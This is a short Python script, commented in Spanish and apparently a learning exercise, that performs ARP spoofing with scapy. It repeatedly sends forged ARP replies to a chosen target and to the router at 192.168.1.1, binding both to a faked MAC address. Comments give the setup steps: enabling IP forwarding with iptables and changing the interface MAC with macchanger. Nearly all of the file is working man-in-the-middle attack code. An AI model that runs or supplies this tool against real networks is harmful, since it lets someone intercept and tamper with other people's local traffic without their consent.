#envenenanmiento arp
import scapy.all as scapy
import argparse
import time

# iptables --policy FORWARD ACCEPT
# cat /proc/sys/net/ipy4/ip_forward
# cambiarlo a unpoo
# ademas debemos cambiar nuestra MAC para que funcione
# macchanger --mac="aa:bb:cc:44:55:66" ens33

def get_arguments():
    parser = argparse.ArgumentParser(description="envenenamiento arp")
    parser.add_argument("-t", "--target",required=True, dest="ip_addres", help="HOST or RANGE to spoof")
    return parser.parse_args()

def spoof(
          ip_addres,  # envia
          spoof_ip # recibe
          ):
    arp_packer = scapy.ARP( 
                            op=2, # eviamos una respuesta, si es uno enviamos una consutla
                            psrc=spoof_ip,  # origen
                            pdst=ip_addres, # destino
                            hwsrc="aa:bb:cc:44:55:66" # mac que queremos vincular 
                            # hardware source
                            )
    scapy.send(arp_packer, verbose=False)


def main():
    while True:
         ip_addres = get_arguments()
         spoof(ip_addres.ip_addres, "192.168.1.1") # falsificamos ala victima
         spoof("192.168.1.1", ip_addres.ip_addres) # falsificamos al router
         time.sleep(2)

if __name__ == "__main__":
    main()